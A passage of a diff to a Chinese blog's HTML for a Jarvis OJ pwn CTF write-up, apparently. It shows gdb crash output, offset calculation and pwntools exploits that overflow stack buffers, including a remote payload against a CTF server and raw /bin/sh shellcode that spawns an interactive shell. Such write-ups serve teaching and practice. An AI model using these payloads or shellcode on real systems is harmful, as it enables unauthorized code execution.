+R9 <span class="token keyword">:</span> 0x7ffff7de7ab0 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_dl_fini<span class="token operator">></span>:    push   rbp<span class="token punctuation">)</span>
+R10: 0x37b 
+R11: 0x246 
+R12: 0x400526 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp<span class="token punctuation">)</span>
+R13: 0x7fffffffdf00 --<span class="token operator">></span> 0x2 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x10206 <span class="token punctuation">(</span>carry PARITY adjust zero sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>
+   0x400514 <span class="token operator">&lt;</span>main+52<span class="token operator">></span>:    mov    edi,0x1
+   0x400519 <span class="token operator">&lt;</span>main+57<span class="token operator">></span>:    call   0x400480 <span class="token operator">&lt;</span>write@plt<span class="token operator">></span>
+   0x40051e <span class="token operator">&lt;</span>main+62<span class="token operator">></span>:    add    rsp,0x88
+<span class="token operator">=</span><span class="token operator">></span> 0x400525 <span class="token operator">&lt;</span>main+69<span class="token operator">></span>:    ret    
+   0x400526 <span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp
+   0x400528 <span class="token operator">&lt;</span>_start+2<span class="token operator">></span>:    mov    r9,rdx
+   0x40052b <span class="token operator">&lt;</span>_start+5<span class="token operator">></span>:    pop    rsi
+   0x40052c <span class="token operator">&lt;</span>_start+6<span class="token operator">></span>:    mov    rdx,rsp
+<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>
+0000<span class="token operator">|</span> 0x7fffffffde28 <span class="token punctuation">(</span><span class="token string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
+0008<span class="token operator">|</span> 0x7fffffffde30 <span class="token punctuation">(</span><span class="token string">"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
+0016<span class="token operator">|</span> 0x7fffffffde38 <span class="token punctuation">(</span><span class="token string">"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
+0024<span class="token operator">|</span> 0x7fffffffde40 <span class="token punctuation">(</span><span class="token string">"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
+0032<span class="token operator">|</span> 0x7fffffffde48 <span class="token punctuation">(</span><span class="token string">"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
+0040<span class="token operator">|</span> 0x7fffffffde50 <span class="token punctuation">(</span><span class="token string">"AuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
+0048<span class="token operator">|</span> 0x7fffffffde58 <span class="token punctuation">(</span><span class="token string">"AAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
+0056<span class="token operator">|</span> 0x7fffffffde60 <span class="token punctuation">(</span><span class="token string">"ZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000000000400525 <span class="token keyword">in</span> main <span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data-lang<span class="token operator">=</span><span class="token string">""</span> data-line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data-trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data-label_position<span class="token operator">=</span><span class="token string">"outer"</span> data-labels_left<span class="token operator">=</span><span class="token string">""</span> data-labels_right<span class="token operator">=</span><span class="token string">""</span> data-labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span>/span<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
+</code></pre>
+<p>发现错误停止在了 main函数 的ret处<br>接下来计算缓冲区的大小<br>由于程序使用的内存地址不能大于0x00007fffffffffff，PC指针并没有指向类似于0x41414141那样地址，但是ret指令等于pop rip，可以通过查看栈顶指针的值确定下一步程序运行的地址。</p>
+<pre><code>gdb-peda$ x/gx $rsp
+0x7fffffffde28:    0x41416d4141514141
+gdb-peda$ pattern offset 0x41416d4141514141
+4702159612987654465 found at offset: 136
+&lt;p class=&quot;code-caption&quot; data-lang=&quot;&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_position=&quot;outer&quot; data-labels_left=&quot;&quot; data-labels_right=&quot;&quot; data-labels_copy=&quot;&quot;&gt;&lt;span class=&quot;code-caption-label&quot;&gt;&lt;/span&gt;&lt;/p&gt;
+</code></pre><p>在GDB里，x是查看内存的指令，随后的gx代表数值用64位16进制显示。随后我们就可以用pattern.py来计算溢出点。<br>得到偏移为136 所以我们就可以构造exp了</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment" spellcheck="true">#p = process('./guestbook')</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn.jarvisoj.com'</span><span class="token punctuation">,</span><span class="token number">9876</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400620</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your message:\n'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+<span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
 <p>运行测试一下<br><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/6.jpg" alt="ida1"><br>成功拿到flag</p>
-<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ checksec level1</div><div class="line">[*] <span class="string">'/home/ios/level1'</span></div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x8048000)</div><div class="line">    RWX:      Has RWX segments</div><div class="line">ios@ubuntu:~$</div></pre></td></tr></table></figure>
-<p>啥都没开2333<br>载入IDA分析<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> vulnerable_function()</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);</div><div class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>发现 read 直接读了buf 存在漏洞<br>利用思路 覆盖溢出buf 写入shellcode 起shell<br>生成shellcode方法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</div><div class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</div><div class="line">shellcode=asm(shellcraft.sh())</div></pre></td></tr></table></figure></p>
-<p>或者使用已经生成好的shellcode<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">shellcode = <span class="string">"\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34"</span></div></pre></td></tr></table></figure></p>
-<p>最终利用exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">p = process(&apos;./level1&apos;)</div><div class="line">shellcode = &quot;\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34&quot;</div><div class="line">ret = p.recvuntil(&apos;?&apos;,drop=True)</div><div class="line">ret = int(ret[12:],16)</div><div class="line">print hex(ret)</div><div class="line">payload = shellcode + &apos;a&apos;*(0x88-len(shellcode)) +&apos;bbbb&apos;+p32(ret)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
-<p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/7.jpg" alt="ida1"><br>成功拿到shell </p>
+<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec level1
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/level1'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+    RWX:      Has RWX segments
+ios@ubuntu:~$
+</code></pre>
+<p>啥都没开2333<br>载入IDA分析</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c">ssize_t <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-88h]</span>
+
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What's this:%p?\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>发现 read 直接读了buf 存在漏洞<br>利用思路 覆盖溢出buf 写入shellcode 起shell<br>生成shellcode方法</p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'i386'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>
+shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<p>或者使用已经生成好的shellcode</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34"</span>
+</code></pre>
+<p>最终利用exp</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>from pwn import *
+p = process(&#39;./level1&#39;)
+shellcode = &quot;\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34&quot;
+ret = p.recvuntil(&#39;?&#39;,drop=True)
+ret = int(ret[12:],16)
+print hex(ret)
+payload = shellcode + &#39;a&#39;*(0x88-len(shellcode)) +&#39;bbbb&#39;+p32(ret)
+p.sendline(payload)
+
+p.interactive()
+</code></pre><p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/7.jpg" alt="ida1"><br>成功拿到shell </p>
 
     
 
